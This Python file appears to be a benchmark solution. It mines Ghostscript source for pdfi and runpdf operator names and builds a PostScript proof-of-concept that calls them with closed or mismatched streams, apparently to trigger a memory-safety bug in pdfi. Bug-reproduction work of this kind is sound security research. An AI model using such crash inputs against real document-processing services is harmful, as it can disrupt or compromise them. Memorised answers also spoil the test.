import os
import re
import tarfile
from typing import Dict, List, Tuple, Iterable, Optional


class Solution:
    def _iter_source_texts(self, src_path: str) -> Iterable[Tuple[str, str]]:
        def should_consider(path_lower: str) -> bool:
            if any(x in path_lower for x in ("pdfi", "/pdf", "\\pdf", "pdf_", "runpdf", "pdf.")):
                return True
            base = os.path.basename(path_lower)
            if base.startswith("pdf") or "pdf" in base:
                return True
            if base.endswith(".ps") and ("pdf" in base or "runpdf" in base):
                return True
            return False

        if os.path.isdir(src_path):
            for root, _, files in os.walk(src_path):
                for fn in files:
                    p = os.path.join(root, fn)
                    pl = p.lower()
                    if not (pl.endswith(".c") or pl.endswith(".h") or pl.endswith(".ps")):
                        continue
                    if not should_consider(pl):
                        continue
                    try:
                        with open(p, "rb") as f:
                            b = f.read()
                        yield p, b.decode("latin-1", errors="ignore")
                    except Exception:
                        continue
        else:
            try:
                with tarfile.open(src_path, "r:*") as tf:
                    for m in tf:
                        if not m.isfile():
                            continue
                        n = m.name
                        nl = n.lower()
                        if not (nl.endswith(".c") or nl.endswith(".h") or nl.endswith(".ps")):
                            continue
                        if m.size > 3_000_000:
                            continue
                        if not should_consider(nl):
                            continue
                        try:
                            f = tf.extractfile(m)
                            if f is None:
                                continue
                            b = f.read()
                            yield n, b.decode("latin-1", errors="ignore")
                        except Exception:
                            continue
            except Exception:
                return

    def _extract_ops(self, src_path: str) -> Dict[str, int]:
        ops: Dict[str, int] = {}

        # Ghostscript op_def strings are often like "1abs" or "1.runpdfbegin"
        # We accept optional dot after count as part of name.
        op_re = re.compile(r'"(\d{1,2})\s*([.][A-Za-z_.$][A-Za-z0-9_.$]{0,80}|[A-Za-z_.$][A-Za-z0-9_.$]{0,80})"')
        for _, txt in self._iter_source_texts(src_path):
            for mo in op_re.finditer(txt):
                try:
                    argc = int(mo.group(1))
                except Exception:
                    continue
                name = mo.group(2).strip()
                # Filter obvious non-ops: require at least one alpha/_/$ char
                if not any((c.isalpha() or c in "_$") for c in name):
                    continue
                # Keep the minimum argc seen
                prev = ops.get(name)
                if prev is None or argc < prev:
                    ops[name] = argc
        return ops

    def _rank_ops(self, ops: Dict[str, int]) -> Tuple[List[Tuple[str, int]], List[Tuple[str, int]], List[Tuple[str, int]]]:
        create_ops: List[Tuple[str, int]] = []
        set_ops: List[Tuple[str, int]] = []
        use_ops: List[Tuple[str, int]] = []

        for name, argc in ops.items():
            nl = name.lower()
            if "pdfi" not in nl and "runpdf" not in nl and not (nl.startswith("pdf") or ".pdf" in nl):
                continue

            is_pdfi = "pdfi" in nl

            if is_pdfi and ("set" in nl) and any(k in nl for k in ("input", "stream", "file")):
                set_ops.append((name, argc))
                continue

            if is_pdfi and any(k in nl for k in ("new", "create", "init", "begin", "open", "start")) and "set" not in nl:
                create_ops.append((name, argc))
                continue

            if is_pdfi and any(k in nl for k in ("read", "seek", "tell", "pos", "token", "getc", "byte", "xref", "obj", "object", "parse", "scan")):
                use_ops.append((name, argc))
                continue

            if "runpdf" in nl and "begin" in nl:
                create_ops.append((name, argc))
                continue

            if ("pdf" in nl) and any(k in nl for k in ("open", "close", "count", "page", "token", "read", "seek", "tell", "position")):
                use_ops.append((name, argc))

        def score(name: str) -> int:
            nl = name.lower()
            s = 0
            if "pdfi" in nl:
                s += 10
            if "stream" in nl:
                s += 10
            if "input" in nl:
                s += 8
            if "read" in nl:
                s += 8
            if "token" in nl:
                s += 6
            if "seek" in nl or "tell" in nl or "pos" in nl or "position" in nl:
                s += 6
            if "xref" in nl or "obj" in nl or "parse" in nl or "scan" in nl:
                s += 4
            if "set" in nl:
                s -= 6
            if "begin" in nl or "open" in nl:
                s += 2
            return s

        create_ops = sorted(set(create_ops), key=lambda x: (score(x[0]), -x[1], x[0]), reverse=True)
        set_ops = sorted(set(set_ops), key=lambda x: (score(x[0]), -x[1], x[0]), reverse=True)
        use_ops = sorted(set(use_ops), key=lambda x: (score(x[0]), -x[1], x[0]), reverse=True)

        return create_ops, set_ops, use_ops

    def _ps_try_wrapper(self) -> str:
        # Ensures:
        # - operand stack cleaned via mark/cleartomark
        # - dictionary stack restored to pre-call depth
        # - $error/newerror cleared if an error occurred
        return (
            "/TRYS {\n"
            "  countdictstack /_ds exch def\n"
            "  mark exch\n"
            "  stopped\n"
            "  dup { $error /newerror false put } if\n"
            "  pop\n"
            "  cleartomark\n"
            "  countdictstack _ds sub dup 0 gt { { end } repeat } { pop } ifelse\n"
            "} bind def\n"
        )

    def _ps_call(self, op: str, args: List[str]) -> str:
        toks = " ".join(args + [op])
        return "{ " + toks + " } TRYS\n"

    def solve(self, src_path: str) -> bytes:
        ops = self._extract_ops(src_path)
        create_ops, set_ops, use_ops = self._rank_ops(ops)

        # Fallback operator candidates (Ghostscript-ish)
        fallback_create = [("runpdfbegin", 1), (".runpdfbegin", 1)]
        fallback_end = ["runpdfend", ".runpdfend"]
        fallback_set = [
            (".pdfi_set_input_stream", 1),
            (".pdfi_set_input", 1),
            (".pdfi_set_input_file", 1),
        ]
        fallback_use = [
            (".pdftoken", 0),
            (".pdfi_tell", 0),
            (".pdfi_seek", 1),
            (".pdfi_read", 1),
            (".pdfi_stream_position", 0),
            ("pdfopen", 0),
            ("pdfclose", 0),
            ("pdfcountpages", 0),
            ("pdfgetpage", 1),
        ]

        # Keep the PoC reasonably small but with multiple attempts.
        create_ops_limited = [x for x in create_ops if x[1] <= 1][:12]
        set_ops_limited = [x for x in set_ops if 1 <= x[1] <= 3][:12]
        use_ops_limited = [x for x in use_ops if x[1] <= 2][:28]

        ps = []
        ps.append("%!PS-Adobe-3.0\n")
        ps.append(self._ps_try_wrapper())
        ps.append("/WF null def /CF null def /NF null def /CTX null def\n")

        # Create some streams that should cause input-stream setup to fail safely.
        ps.append("{ (%stdout) (w) file /WF exch def } TRYS\n")
        ps.append("{ (%stdin) (r) file dup /CF exch def closefile } TRYS\n")
        ps.append("{ (%null) (r) file dup /NF exch def closefile } TRYS\n")

        # Try to create/init a pdfi context (if such ops exist).
        for op, argc in create_ops_limited:
            if argc == 0:
                ps.append(self._ps_call(op, []))
                ps.append(self._ps_call(op, ["dup", "/CTX", "exch", "def", "pop"]))
            elif argc == 1:
                ps.append(self._ps_call(op, ["0"]))
                ps.append(self._ps_call(op, ["0", "dup", "/CTX", "exch", "def", "pop"]))

        # Try runpdfbegin variants.
        for op, argc in fallback_create:
            if argc == 0:
                ps.append(self._ps_call(op, []))
            else:
                ps.append(self._ps_call(op, ["CF"]))
                ps.append(self._ps_call(op, ["WF"]))
                ps.append(self._ps_call(op, ["NF"]))
                ps.append(self._ps_call(op, ["CF", "()"]))
                ps.append(self._ps_call(op, ["WF", "()"]))

        # If the source contains explicit runpdfbegin operators, try them too.
        for name in ("runpdfbegin", ".runpdfbegin"):
            if name in ops:
                argc = ops[name]
                if argc == 0:
                    ps.append(self._ps_call(name, []))
                elif argc == 1:
                    ps.append(self._ps_call(name, ["CF"]))
                    ps.append(self._ps_call(name, ["WF"]))
                elif argc == 2:
                    ps.append(self._ps_call(name, ["CF", "()"]))
                    ps.append(self._ps_call(name, ["WF", "()"]))
                elif argc == 3:
                    ps.append(self._ps_call(name, ["CF", "()", "0"]))
                    ps.append(self._ps_call(name, ["WF", "()", "0"]))

        # Attempt explicit "set input stream" operators (if present).
        for op, argc in (set_ops_limited + fallback_set):
            if argc == 1:
                ps.append(self._ps_call(op, ["CF"]))
                ps.append(self._ps_call(op, ["WF"]))
                ps.append(self._ps_call(op, ["NF"]))
                ps.append(self._ps_call(op, ["CTX"]))
            elif argc == 2:
                ps.append(self._ps_call(op, ["CF", "()"]))
                ps.append(self._ps_call(op, ["WF", "()"]))
                ps.append(self._ps_call(op, ["CTX", "CF"]))
                ps.append(self._ps_call(op, ["CTX", "WF"]))
            elif argc == 3:
                ps.append(self._ps_call(op, ["CF", "()", "0"]))
                ps.append(self._ps_call(op, ["WF", "()", "0"]))
                ps.append(self._ps_call(op, ["CTX", "CF", "0"]))
                ps.append(self._ps_call(op, ["CTX", "WF", "0"]))

        # Exercise PDF operators that may touch the pdfi input stream.
        # Prefer ones that take 0 or 1 operand; provide both int and string args for 1-operand ops.
        for op, argc in use_ops_limited:
            if argc == 0:
                ps.append(self._ps_call(op, []))
            elif argc == 1:
                nl = op.lower()
                if "read" in nl or "token" in nl:
                    ps.append(self._ps_call(op, ["1", "string"]))
                    ps.append(self._ps_call(op, ["0"]))
                elif "seek" in nl:
                    ps.append(self._ps_call(op, ["0"]))
                else:
                    ps.append(self._ps_call(op, ["0"]))
            elif argc == 2:
                ps.append(self._ps_call(op, ["0", "0"]))

        # Also try some higher-level pdfdict procedures.
        ps.append("{ pdfdict begin pdfopen end } TRYS\n")
        ps.append("{ pdfdict begin pdfclose end } TRYS\n")
        ps.append("{ pdfdict begin pdfcountpages end } TRYS\n")
        ps.append("{ pdfdict begin 1 pdfgetpage end } TRYS\n")

        # Cleanup/end sequences (may touch stream too).
        for eop in fallback_end:
            ps.append(self._ps_call(eop, []))

        # A few fixed guesses that sometimes exist as internal operators.
        for op, argc in fallback_use:
            if argc == 0:
                ps.append(self._ps_call(op, []))
            elif argc == 1:
                if "read" in op.lower() or "token" in op.lower():
                    ps.append(self._ps_call(op, ["1", "string"]))
                else:
                    ps.append(self._ps_call(op, ["0"]))

        ps.append("quit\n")
        return "".join(ps).encode("ascii", errors="ignore")